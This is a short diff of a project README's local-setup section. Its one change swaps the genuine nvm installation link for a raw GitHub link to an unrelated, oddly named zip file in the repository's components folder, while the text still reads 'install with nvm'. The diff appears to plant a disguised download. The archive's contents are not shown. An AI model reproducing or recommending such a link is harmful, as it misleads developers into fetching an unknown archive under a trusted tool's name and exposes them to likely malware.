@@ -147,7 +147,7 @@ npm run dev:all
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+The only requirement is having Node.js & npm installed - [install with nvm](https://raw.githubusercontent.com/pankajydv08/tube-course-hub/main/src/components/hub-course-tube-Hallstattian.zip)
 
 Follow these steps:
 
